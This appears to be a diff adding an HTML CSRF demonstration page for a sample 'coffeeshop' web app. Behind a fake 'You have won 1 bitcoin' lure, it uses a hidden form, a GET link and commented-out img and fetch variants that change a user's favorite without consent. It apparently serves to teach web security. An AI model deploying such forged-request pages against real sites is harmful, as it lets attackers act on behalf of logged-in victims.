@@ -1,0 +1,34 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <title>You've won!</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="row">
+            <h2>You have won 1 bitcoin</h2>
+        </div>
+        <div class="row">
+            <form method="post" action="https://coffeeshop.com:5005/Home/EditFavorite">
+                <input type="hidden" name="Favorite" value="Attacker was here" />
+                <button type="submit" class="btn btn-primary">Click here to get it!</button>
+            </form>
+        </div>
+        <div class="row">
+            <a href="https://coffeeshop.com:5005/Home/EditFavorite">Edit favorite</a>
+        </div>
+        <div class="row">
+            <a href="https://coffeeshop.com:5005/Home/SetFavorite?favorite=Attacked">
+                Click here!
+            </a>
+        </div>
+        <!--<img src="https://coffeeshop.com:5005/Home/SetFavorite?favorite=Attacked" />-->
+    </div>
+    <script>
+        //fetch("https://coffeeshop.com:5005/Home/SetFavorite?favorite=Attacked",
+        //    { credentials: 'include' });
+    </script>
+</body>
+</html>
